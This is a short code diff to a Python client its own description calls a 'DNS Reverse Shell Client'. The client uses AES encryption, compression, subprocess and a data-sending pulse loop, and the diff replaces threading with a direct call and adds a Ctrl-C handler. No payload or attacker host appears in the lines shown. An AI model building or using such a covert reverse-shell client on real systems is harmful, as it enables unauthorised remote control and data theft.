@@ -6,11 +6,18 @@ from time import sleep
 from Crypto.Cipher import AES
 
 import subprocess
-import threading
 import argparse
 import zlib
 import hashlib
-import os
+import signal
+
+
+def ctrl_c_handler(signal, frame):
+    print("Client Stopped")
+    exit(0)
+
+
+signal.signal(signal.SIGINT, ctrl_c_handler)
 
 parser = argparse.ArgumentParser(description="DNS Reverse Shell Client")
 parser.add_argument('domain', metavar='domain', type=str, help='Domain to connect to')
@@ -173,7 +180,7 @@ def send_data(data: bytes) -> None:
 
 def main():
     print("Client started!")
-    threading.Thread(target=pulse).start()
+    pulse()
 
 
 if __name__ == "__main__":
